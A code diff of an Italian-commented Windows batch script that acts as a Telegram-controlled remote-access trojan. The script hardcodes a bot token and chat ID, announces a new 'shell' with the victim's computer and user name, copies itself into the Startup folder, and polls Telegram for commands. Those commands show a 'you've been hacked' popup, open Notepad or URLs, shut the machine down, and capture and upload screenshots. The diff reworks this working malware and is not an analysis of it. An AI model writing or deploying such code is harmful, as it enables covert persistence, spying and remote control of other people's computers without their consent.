@@ -12,7 +12,7 @@ setlocal enabledelayedexpansion
 set "BOT_TOKEN=7711566157:AAEs2eaKEVqE5pWYLc9L4WiDIc8vS5n83hw"
 set "CHAT_ID=5709299213"
 set "SCREENSHOT_PATH=%TEMP%\%RANDOM%.png"
-set "LAST_COMMAND_ID=0"
+set "URL_FILE=%TEMP%\last_url.txt"
 
 :: Invia notifica di connessione
 curl -s -X POST "https://api.telegram.org/bot%BOT_TOKEN%/sendMessage" ^
@@ -20,8 +20,8 @@ curl -s -X POST "https://api.telegram.org/bot%BOT_TOKEN%/sendMessage" ^
     -d "text=🟢 Shell aperta su: %COMPUTERNAME% (%USERNAME%)"
 
 :: Aggiungi all'avvio automatico
-if not exist "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\remote_shell.bat" (
-    copy "%~f0" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\remote_shell.bat"
+if not exist "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\remote_controller.bat" (
+    copy "%~f0" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
 )
 
 :: Verifica/installa curl
@@ -36,55 +36,44 @@ where curl >nul 2>&1 || (
 :: Loop principale
 :command_loop
 :: Controlla nuovi messaggi
-curl -s -X GET "https://api.telegram.org/bot%BOT_TOKEN%/getUpdates?offset=%LAST_COMMAND_ID%" > "%TEMP%\updates.json"
+curl -s -X GET "https://api.telegram.org/bot%BOT_TOKEN%/getUpdates" > "%TEMP%\updates.json"
 
 :: Estrai comandi dai messaggi
-for /f "tokens=*" %%A in ('powershell -command "$json=Get-Content '%TEMP%\updates.json'|ConvertFrom-Json;if($json.ok){$json.result|ForEach-Object{if($_.message.text -and $_.update_id -gt %LAST_COMMAND_ID%){Write-Output ($_.update_id.ToString()+':'+$_.message.text)}}}"') do (
-    set "update_data=%%A"
-    set "LAST_COMMAND_ID=!update_data:*:=!"
-    set "full_command=!update_data:*:=!"
+for /f "tokens=1,* delims= " %%A in ('powershell -command "$json=Get-Content '%TEMP%\updates.json'|ConvertFrom-Json;if($json.ok){$json.result|ForEach-Object{if($_.message.text){Write-Output ($_.message.text)}}}"') do (
+    set "cmd=%%A"
+    set "arg=%%B"
     
-    :: Estrai comando e argomento
-    for /f "tokens=1,*" %%B in ("!full_command!") do (
-        set "command=%%B"
-        set "arg=%%C"
-    )
+    :: Notifica comando ricevuto
+    curl -s -X POST "https://api.telegram.org/bot%BOT_TOKEN%/sendMessage" ^
+        -d "chat_id=%CHAT_ID%" ^
+        -d "text=📡 Comando ricevuto: %%A %%B"
     
-    if /i "!command!" == "pop" (
-        :: Mostra popup "Sei stato hackerato"
-        powershell -command "[System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms'); [System.Windows.Forms.MessageBox]::Show('SEI STATO HACKERATO','ATTENZIONE',[System.Windows.Forms.MessageBoxButtons]::OK,[System.Windows.Forms.MessageBoxIcon]::Warning)"
+    if /i "!cmd!" == "pop" (
+        :: Mostra popup
+        mshta vbscript:Execute("msgbox ""Sei stato hackerato!"",0,""Avviso di sicurezza"")(window.close)
         curl -s -X POST "https://api.telegram.org/bot%BOT_TOKEN%/sendMessage" ^
             -d "chat_id=%CHAT_ID%" ^
             -d "text=✅ Popup mostrato su %COMPUTERNAME%"
-    )
     
-    if /i "!command!" == "note" (
-        :: Apri Notepad con testo specificato
-        if defined arg (
-            echo !arg! > "%TEMP%\note.txt"
-            start notepad "%TEMP%\note.txt"
-            curl -s -X POST "https://api.telegram.org/bot%BOT_TOKEN%/sendMessage" ^
-                -d "chat_id=%CHAT_ID%" ^
-                -d "text=📝 Notepad aperto su %COMPUTERNAME% con testo: !arg!"
-        ) else (
-            curl -s -X POST "https://api.telegram.org/bot%BOT_TOKEN%/sendMessage" ^
-                -d "chat_id=%CHAT_ID%" ^
-                -d "text=❌ Specifica il testo dopo 'note'"
-        )
-    )
-    
-    if /i "!command!" == "off" (
-        :: Spegni il computer
+    ) else if /i "!cmd!" == "note" (
+        :: Apri notepad con testo
+        echo !arg! > "%TEMP%\note.txt"
+        notepad "%TEMP%\note.txt"
         curl -s -X POST "https://api.telegram.org/bot%BOT_TOKEN%/sendMessage" ^
             -d "chat_id=%CHAT_ID%" ^
-            -d "text=🔴 Spegnimento di: %COMPUTERNAME%"
-        shutdown /s /t 0
-        exit
-    )
+            -d "text=📝 Notepad aperto su %COMPUTERNAME% con testo: !arg!"
     
-    if /i "!command!" == "foto" (
-        :: Cattura screenshot e invia
-        call :capture_screen
+    ) else if /i "!cmd!" == "off" (
+        :: Spegni computer
+        curl -s -X POST "https://api.telegram.org/bot%BOT_TOKEN%/sendMessage" ^
+            -d "chat_id=%CHAT_ID%" ^
+            -d "text=🔴 Spegnimento di %COMPUTERNAME% in corso..."
+        shutdown /s /t 0
+    
+    ) else if /i "!cmd!" == "foto" (
+        :: Cattura screenshot
+        powershell -command "Add-Type -AssemblyName System.Windows.Forms; [Windows.Forms.SendKeys]::SendWait('{PRTSC}'); Start-Sleep -Milliseconds 1000; $img=[Windows.Forms.Clipboard]::GetImage(); if($img){$img.Save('%SCREENSHOT_PATH%',[Drawing.Imaging.ImageFormat]::Png)}"
+        
         if exist "%SCREENSHOT_PATH%" (
             curl -s -X POST "https://api.telegram.org/bot%BOT_TOKEN%/sendPhoto" ^
                 -F chat_id=%CHAT_ID% ^
@@ -92,26 +81,15 @@ for /f "tokens=*" %%A in ('powershell -command "$json=Get-Content '%TEMP%\update
                 -F caption="📸 Screenshot da %COMPUTERNAME%"
             del "%SCREENSHOT_PATH%" >nul
         )
-    )
     
-    if /i "!command!" == "url" (
-        :: Apri URL specificato
-        if defined arg (
-            echo !arg! | findstr /r /c:"^http://" /c:"^https://" >nul
-            if errorlevel 1 (
-                curl -s -X POST "https://api.telegram.org/bot%BOT_TOKEN%/sendMessage" ^
-                    -d "chat_id=%CHAT_ID%" ^
-                    -d "text=❌ URL non valido: !arg!"
-            ) else (
-                start "" "!arg!"
-                curl -s -X POST "https://api.telegram.org/bot%BOT_TOKEN%/sendMessage" ^
-                    -d "chat_id=%CHAT_ID%" ^
-                    -d "text=🌍 Aperto URL su %COMPUTERNAME%: !arg!"
-            )
-        ) else (
+    ) else if /i "!cmd!" == "url" (
+        :: Apri URL
+        if "!arg!" neq "" (
+            echo !arg! > "%URL_FILE%"
+            start "" "!arg!"
             curl -s -X POST "https://api.telegram.org/bot%BOT_TOKEN%/sendMessage" ^
                 -d "chat_id=%CHAT_ID%" ^
-                -d "text=❌ Specifica un URL dopo 'url'"
+                -d "text=🌐 URL aperto su %COMPUTERNAME%: !arg!"
         )
     )
 )
@@ -119,8 +97,3 @@ for /f "tokens=*" %%A in ('powershell -command "$json=Get-Content '%TEMP%\update
 :: Attesa prima di controllare nuovi comandi
 timeout /t 5 /nobreak >nul
 goto command_loop
-
-:capture_screen
-:: Cattura schermo intero
-powershell -command "Add-Type -AssemblyName System.Windows.Forms; [Windows.Forms.SendKeys]::SendWait('{PRTSC}'); Start-Sleep -Milliseconds 1000; $img=[Windows.Forms.Clipboard]::GetImage(); if($img){$img.Save('%SCREENSHOT_PATH%',[Drawing.Imaging.ImageFormat]::Png)}"
-exit /b
